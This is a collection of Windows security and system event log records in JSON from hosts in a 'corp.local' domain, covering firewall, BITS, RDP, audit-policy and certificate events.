{"EventTime":"2021-08-27T11:50:56.358840+05:45","Hostname":"IT01.corp.local","Keywords":"9232379236109516800","EventType":"AUDIT_SUCCESS","SeverityValue":2,"Severity":"INFO","EventID":5154,"SourceName":"Microsoft-Windows-Security-Auditing","ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","Version":0,"TaskValue":12810,"OpcodeValue":0,"RecordNumber":1080407,"ExecutionProcessID":4,"ExecutionThreadID":2580,"Channel":"Security","Message":"The Windows Filtering Platform has permitted an application or service to listen on a port for incoming connections.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3736\r\n\tApplication Name:\t\\device\\harddiskvolume2\\windows\\system32\\svchost.exe\r\n\r\nNetwork Information:\r\n\tSource Address:\t\t::\r\n\tSource Port:\t\t7680\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t82911\r\n\tLayer Name:\t\tListen\r\n\tLayer Run-Time ID:\t42","Category":"Filtering Platform Connection","Opcode":"Info","ProcessId":"3736","Application":"\\device\\harddiskvolume2\\windows\\system32\\svchost.exe","SourceAddress":"::","SourcePort":"7680","Protocol":"6","FilterRTID":"82911","LayerName":"%%14609","LayerRTID":"42","EventReceivedTime":"2021-08-27T11:51:02.183961+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-08-27T13:03:47.689751+05:45","Hostname":"IT01.corp.local","Keywords":"9232379236109516800","EventType":"AUDIT_SUCCESS","SeverityValue":2,"Severity":"INFO","EventID":4719,"SourceName":"Microsoft-Windows-Security-Auditing","ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","Version":0,"TaskValue":13568,"OpcodeValue":0,"RecordNumber":4025734,"ActivityID":"{EB507E61-9B07-0001-E57E-50EB079BD701}","ExecutionProcessID":664,"ExecutionThreadID":5660,"Channel":"Security","Message":"System audit policy was changed.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-18\r\n\tAccount Name:\t\tIT01$\r\n\tAccount Domain:\t\tCORP\r\n\tLogon ID:\t\t0x3E7\r\n\r\nAudit Policy Change:\r\n\tCategory:\t\tObject Access\r\n\tSubcategory:\t\tFiltering Platform Connection\r\n\tSubcategory GUID:\t{0cce9226-69ae-11d9-bed3-505054503030}\r\n\tChanges:\t\tSuccess removed, Failure removed","Category":"Audit Policy Change","Opcode":"Info","SubjectUserSid":"S-1-5-18","SubjectUserName":"IT01$","SubjectDomainName":"CORP","SubjectLogonId":"0x3e7","CategoryId":"%%8274","SubcategoryId":"%%12810","SubcategoryGuid":"{0cce9226-69ae-11d9-bed3-505054503030}","AuditPolicyChanges":"%%8448, %%8450","EventReceivedTime":"2021-08-27T13:03:57.170570+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-08-27T13:57:19.612056+05:45","Hostname":"IT01.corp.local","Keywords":"4611686018427387904","EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":5,"SourceName":"Microsoft-Windows-Bits-Client","ProviderGuid":"{EF1CC15B-46C1-414E-BB95-E76B077BD51E}","Version":1,"TaskValue":0,"OpcodeValue":0,"RecordNumber":4487,"ExecutionProcessID":376,"ExecutionThreadID":268,"Channel":"Microsoft-Windows-Bits-Client/Operational","Domain":"CORP","AccountName":"Leo","UserID":"S-1-5-21-2569713578-3403938347-3732993993-1139","AccountType":"User","Message":"Job cancelled. User: CORP\\Leo, job: FontUpdates, jobID: {463719c1-b25d-4b8f-b4a1-525dad474fe4}, owner: CORP\\Leo, filecount: 1","Opcode":"Info","User":"CORP\\Leo","jobTitle":"FontUpdates","jobId":"{463719c1-b25d-4b8f-b4a1-525dad474fe4}","jobOwner":"CORP\\Leo","fileCount":"1","EventReceivedTime":"2021-08-27T13:57:20.754237+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-08-27T14:39:14.153219+05:45","Hostname":"IT01.corp.local","Keywords":"4611686018427387904","EventType":"WARNING","SeverityValue":3,"Severity":"WARNING","EventID":142,"SourceName":"Microsoft-Windows-RemoteDesktopServices-RdpCoreTS","ProviderGuid":"{1139C61B-B549-4251-8ED3-27250A1EDEC8}","Version":0,"TaskValue":4,"OpcodeValue":15,"RecordNumber":23447,"ActivityID":"{F420ABE0-482B-4478-B140-1FFFC2130000}","ExecutionProcessID":444,"ExecutionThreadID":3120,"Channel":"Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational","Domain":"NT AUTHORITY","AccountName":"NETWORK SERVICE","UserID":"S-1-5-20","AccountType":"Well Known Group","Message":"TCP socket READ operation failed, error 121","Category":"RemoteFX module","Opcode":"EstablishConnection","error":"121","EventReceivedTime":"2021-08-27T14:39:15.558337+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-08-27T14:39:14.153126+05:45","Hostname":"IT01.corp.local","Keywords":"4611686018427387904","EventType":"WARNING","SeverityValue":3,"Severity":"WARNING","EventID":226,"SourceName":"Microsoft-Windows-RemoteDesktopServices-RdpCoreTS","ProviderGuid":"{1139C61B-B549-4251-8ED3-27250A1EDEC8}","Version":0,"TaskValue":4,"OpcodeValue":19,"RecordNumber":23446,"ActivityID":"{F420ABE0-482B-4478-B140-1FFFC2130000}","ExecutionProcessID":444,"ExecutionThreadID":3256,"Channel":"Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational","Domain":"NT AUTHORITY","AccountName":"NETWORK SERVICE","UserID":"S-1-5-20","AccountType":"Well Known Group","Message":"RDP_TCP: An error was encountered when transitioning from StateUnknown in response to Event_Disconnect (error code 0x80070079).","Category":"RemoteFX module","Opcode":"Runtime","StateTransition":"RDP_TCP","PreviousState":"23","PreviousStateName":"StateUnknown","NewState":"21","NewStateName":"StateDisconnected","Event":"43","EventName":"Event_Disconnect","ErrorCode":"0x80070079","EventReceivedTime":"2021-08-27T14:39:15.542661+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-08-26T13:44:10.000000+05:45","Hostname":"DC01.corp.local","Keywords":"36028797018963968","EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":5186,"SourceName":"Microsoft-Windows-WAS","ProviderGuid":"{524B5D04-133C-4A62-8362-64E8EDB9CE40}","Version":0,"TaskValue":0,"OpcodeValue":0,"RecordNumber":643688,"ExecutionProcessID":0,"ExecutionThreadID":0,"Channel":"System","Message":"A worker process with process id of '4960' serving application pool 'DefaultAppPool' was shutdown due to inactivity.  Application Pool timeout configuration was set to 20 minutes.  A new worker process will be started when needed.","ProcessID":"4960","AppPoolID":"DefaultAppPool","Minutes":"20","EventReceivedTime":"2021-08-26T13:44:10.292665+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-08-24T18:42:51.088417+05:45","Hostname":"IT01.corp.local","Keywords":"9227875636482146304","EventType":"AUDIT_FAILURE","SeverityValue":4,"Severity":"ERROR","EventID":5157,"SourceName":"Microsoft-Windows-Security-Auditing","ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","Version":1,"TaskValue":12810,"OpcodeValue":0,"RecordNumber":669153,"ExecutionProcessID":4,"ExecutionThreadID":3572,"Channel":"Security","Message":"The Windows Filtering Platform has blocked a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t1188\r\n\tApplication Name:\t\\device\\harddiskvolume2\\windows\\system32\\svchost.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t192.168.2.46\r\n\tSource Port:\t\t51163\r\n\tDestination Address:\t45.64.115.163\r\n\tDestination Port:\t\t80\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t129097\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","Category":"Filtering Platform Connection","Opcode":"Info","ProcessID":"1188","Application":"\\device\\harddiskvolume2\\windows\\system32\\svchost.exe","Direction":"%%14593","SourceAddress":"192.168.2.46","SourcePort":"51163","DestAddress":"45.64.115.163","DestPort":"80","Protocol":"6","FilterRTID":"129097","LayerName":"%%14611","LayerRTID":"48","RemoteUserID":"S-1-0-0","RemoteMachineID":"S-1-0-0","EventReceivedTime":"2021-08-24T18:42:52.324951+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-08-24T03:59:41.523918+05:45","Hostname":"IT01.corp.local","Keywords":"4611686018427387904","EventType":"WARNING","SeverityValue":3,"Severity":"WARNING","EventID":61,"SourceName":"Microsoft-Windows-Bits-Client","ProviderGuid":"{EF1CC15B-46C1-414E-BB95-E76B077BD51E}","Version":1,"TaskValue":0,"OpcodeValue":2,"RecordNumber":4413,"ActivityID":"{CA6DB3DC-B6B4-4857-A175-060860AE13A2}","ExecutionProcessID":348,"ExecutionThreadID":2324,"Channel":"Microsoft-Windows-Bits-Client/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"BITS stopped transferring the SpeechModelDownloadJob transfer job that is associated with the https://msftspeechmodelsprod.azureedge.net/SR/SV10-EV100/en-us-n/MV101/naspmodelsmetadata.xml URL. The status code is 0x80072EE7.","Opcode":"Stop","transferId":"{ca6db3dc-b6b4-4857-a175-060860ae13a2}","name":"SpeechModelDownloadJob","Id":"{fac5e752-7af3-45df-95c6-302e0fae5b92}","url":"https://msftspeechmodelsprod.azureedge.net/SR/SV10-EV100/en-us-n/MV101/naspmodelsmetadata.xml","hr":"2147954407","fileTime":"1601-01-01T00:00:00.000000000Z","fileLength":"18446744073709551615","bytesTotal":"18446744073709551615","bytesTransferred":"0","peerProtocolFlags":"0","bytesTransferredFromPeer":"0","AdditionalInfoHr":"0","PeerContextInfo":"0","bandwidthLimit":"18446744073709551615","ignoreBandwidthLimitsOnLan":"false","EventReceivedTime":"2021-08-24T03:59:42.470303+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-08-11T11:47:25.437659+05:45","Hostname":"DC01.corp.local","Keywords":"9223372036854775808","EventType":"WARNING","SeverityValue":3,"Severity":"WARNING","EventID":5612,"SourceName":"Microsoft-Windows-WMI","ProviderGuid":"{1EDEEE53-0AFE-4609-B846-D8C0B2075B1F}","Version":2,"TaskValue":0,"OpcodeValue":0,"RecordNumber":115635,"ExecutionProcessID":2124,"ExecutionThreadID":2156,"Channel":"Application","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Windows Management Instrumentation has stopped WMIPRVSE.EXE because a quota reached a warning value. Quota: HandleCount  Value: 4098 Maximum value: 4096 WMIPRVSE PID: 2124 Providers hosted in this process: %systemroot%\\system32\\wbem\\wmiprov.dll, C:\\Windows\\System32\\wbem\\WmiPerfClass.dll","Opcode":"Info","UserData":"<data_0x8000003F xmlns='http://manifests.microsoft.com/win/2006/windows/WMI'><QuotaName>HandleCount</QuotaName><QuotaValue>4098</QuotaValue><QuotaThreshold>4096</QuotaThreshold><ProcessID>2124</ProcessID><ProvidersInHost>%systemroot%\\system32\\wbem\\wmiprov.dll, C:\\Windows\\System32\\wbem\\WmiPerfClass.dll</ProvidersInHost></data_0x8000003F>","EventReceivedTime":"2021-08-11T11:47:27.297016+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-08-10T00:00:24.987964+05:45","Hostname":"IT01.corp.local","Keywords":"9223372036854775808","EventType":"WARNING","SeverityValue":3,"Severity":"WARNING","EventID":16385,"SourceName":"Microsoft-Windows-Bits-Client","ProviderGuid":"{EF1CC15B-46C1-414E-BB95-E76B077BD51E}","Version":0,"TaskValue":0,"OpcodeValue":0,"RecordNumber":24011,"ExecutionProcessID":348,"ExecutionThreadID":3188,"Channel":"System","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"While canceling job \"Edge Component Updater\", BITS was unable to remove some temporary files. To recover disk space, delete the files listed below.  The job ID was {fc0a2758-93c2-4d16-9d95-9a09673ca5d4}.      C:\\Users\\lau\\AppData\\Local\\Temp\\edge_BITS_7068_1127678655\\BIT5FCC.tmp\n","Opcode":"Info","Id":"{fc0a2758-93c2-4d16-9d95-9a09673ca5d4}","Title":"Edge Component Updater","FileList":"    C:\\Users\\lau\\AppData\\Local\\Temp\\edge_BITS_7068_1127678655\\BIT5FCC.tmp\n","EventReceivedTime":"2021-08-10T00:00:25.659297+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-08-04T13:22:34.446811+05:45","Hostname":"IT02.corp.local","Keywords":"36028797018963968","EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":4004,"SourceName":"Microsoft-Windows-Winlogon","ProviderGuid":"{DBE9B383-7CF3-4331-91CC-A3CB16A3B538}","Version":0,"TaskValue":0,"OpcodeValue":0,"RecordNumber":65543,"ExecutionProcessID":0,"ExecutionThreadID":0,"Channel":"Application","Message":"The Windows logon process has failed to terminate the currently logged on user's processes.","EventData.Binary":"E303000000000100","EventReceivedTime":"2021-08-04T13:22:34.804207+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-08-04T13:22:34.446811+05:45","Hostname":"IT02.corp.local","Keywords":"9259400833873739776","EventType":"WARNING","SeverityValue":3,"Severity":"WARNING","EventID":1077,"SourceName":"User32","ProviderGuid":"{B0AA8734-56F7-41CC-B2F4-DE228E98B946}","Version":0,"TaskValue":0,"OpcodeValue":0,"RecordNumber":67793,"ExecutionProcessID":10116,"ExecutionThreadID":8884,"Channel":"System","Domain":"CORP","AccountName":"Leo","UserID":"S-1-5-21-2569713578-3403938347-3732993993-1139","AccountType":"User","Message":"The attempt by user CORP\\Leo to logoff computer IT02 failed","param1":"IT02","param2":"CORP\\Leo","EventReceivedTime":"2021-08-04T13:22:37.054068+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-08-03T16:46:07.622251+05:45","Hostname":"IT03.corp.local","Keywords":"9259400833873739776","EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":4097,"SourceName":"Microsoft-Windows-CAPI2","ProviderGuid":"{5BBCA4A8-B209-48DC-A8C7-B23D3E5216FB}","Version":0,"TaskValue":0,"OpcodeValue":0,"RecordNumber":24262,"ExecutionProcessID":2488,"ExecutionThreadID":956,"Channel":"Application","Message":"Successful auto update of third-party root certificate:: Subject: <CN=DigiCert Trusted Root G4, OU=www.digicert.com, O=DigiCert Inc, C=US> Sha1 thumbprint: <DDFB16CD4931C973A2037D3FC83A4D7D775D05E4>.","Opcode":"Info","EventData":"<Data>CN=DigiCert Trusted Root G4, OU=www.digicert.com, O=DigiCert Inc, C=US</Data><Data>DDFB16CD4931C973A2037D3FC83A4D7D775D05E4</Data>","EventReceivedTime":"2021-08-03T16:46:08.498909+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-08-03T14:49:32.779696+05:45","Hostname":"IT03.corp.local","Keywords":"9232379236109516800","EventType":"AUDIT_SUCCESS","SeverityValue":2,"Severity":"INFO","EventID":4659,"SourceName":"Microsoft-Windows-Security-Auditing","ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","Version":0,"TaskValue":12800,"OpcodeValue":0,"RecordNumber":40679545,"ExecutionProcessID":4,"ExecutionThreadID":6784,"Channel":"Security","Message":"A handle to an object was requested with intent to delete.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-18\r\n\tAccount Name:\t\tIT03$\r\n\tAccount Domain:\t\tCORP\r\n\tLogon ID:\t\t0x3E7\r\n\r\nObject:\r\n\tObject Server:\tSecurity\r\n\tObject Type:\tFile\r\n\tObject Name:\tC:\\Windows\\WinSxS\\Temp\\PendingDeletes\\54c719934688d7016001000058073418.msvcr120_clr0400.dll\r\n\tHandle ID:\t0x0\r\n\r\nProcess Information:\r\n\tProcess ID:\t0x758\r\n\r\nAccess Request Information:\r\n\tTransaction ID:\t{706f1550-f438-11eb-b4cc-000c29d3d841}\r\n\tAccesses:\tDELETE\r\n\t\t\t\t\r\n\tAccess Mask:\t0x10000\r\n\tPrivileges Used for Access Check:\t-","Category":"File System","Opcode":"Info","SubjectUserSid":"S-1-5-18","SubjectUserName":"IT03$","SubjectDomainName":"CORP","SubjectLogonId":"0x3e7","ObjectServer":"Security","ObjectType":"File","ObjectName":"C:\\Windows\\WinSxS\\Temp\\PendingDeletes\\54c719934688d7016001000058073418.msvcr120_clr0400.dll","HandleId":"0x0","TransactionId":"{706f1550-f438-11eb-b4cc-000c29d3d841}","AccessList":"%%1537\r\n\t\t\t\t","AccessMask":"0x10000","PrivilegeList":"-","ProcessId":"0x758","EventReceivedTime":"2021-08-03T14:49:33.556088+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-08-04T01:07:08.669906+05:45","Hostname":"IT01.corp.local","Keywords":"9227875636482146304","EventType":"AUDIT_FAILURE","SeverityValue":4,"Severity":"ERROR","EventID":5152,"SourceName":"Microsoft-Windows-Security-Auditing","ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","Version":0,"TaskValue":12809,"OpcodeValue":0,"RecordNumber":434230,"ExecutionProcessID":4,"ExecutionThreadID":4920,"Channel":"Security","Message":"The Windows Filtering Platform has blocked a packet.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t0\r\n\tApplication Name:\t-\r\n\r\nNetwork Information:\r\n\tDirection:\t\tInbound\r\n\tSource Address:\t\t192.168.2.47\r\n\tSource Port:\t\t389\r\n\tDestination Address:\t192.168.2.46\r\n\tDestination Port:\t\t54734\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t108993\r\n\tLayer Name:\t\tTransport\r\n\tLayer Run-Time ID:\t13","Category":"Filtering Platform Packet Drop","Opcode":"Info","ProcessId":"0","Application":"-","Direction":"%%14592","SourceAddress":"192.168.2.47","SourcePort":"389","DestAddress":"192.168.2.46","DestPort":"54734","Protocol":"6","FilterRTID":"108993","LayerName":"%%14597","LayerRTID":"13","EventReceivedTime":"2021-08-04T01:07:10.438303+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}